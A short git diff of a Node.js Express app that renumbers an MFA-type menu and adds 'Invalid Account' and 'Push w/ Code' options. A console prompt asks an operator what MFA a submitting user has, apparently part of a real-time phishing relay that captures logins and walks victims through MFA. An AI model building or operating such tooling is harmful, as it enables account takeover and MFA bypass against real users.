@@ -55,11 +55,13 @@ app.post("/submit", async (req, res) => {
   // set up mfa style and translation dict
   var mfa_code = 0;
   var mfa_translation = {
-    0: "SMS",
-    1: "Call",
-    2: "Email",
-    3: "TOTP",
-    4: "Push Notification"
+    0: "Invalid Account",
+    1: "SMS",
+    2: "Call",
+    3: "Email",
+    4: "TOTP",
+    5: "Push Notification",
+    6: "Push Notification w/ Code"
    }
 
    // handle request accordingly
@@ -112,7 +114,7 @@ function waitOnMFA() {
     output: process.stdout,
   });
 
-  const query = "MFA Styles Available\n  0: SMS\n  1: Call\n  2: Email\n  3: TOTP\n  4: Push Notificaiton\nWhat MFA does the user have? "
+  const query = "MFA Styles Available\n  0: Invalid Account\n  1: SMS\n  2: Call\n  3: Email\n  4: TOTP\n  5: Push Notificaiton\n  6: Push w/ Code\nWhat MFA does the user have? "
   return new Promise(resolve => rl.question(query, ans => {
     rl.close();
     resolve(ans);
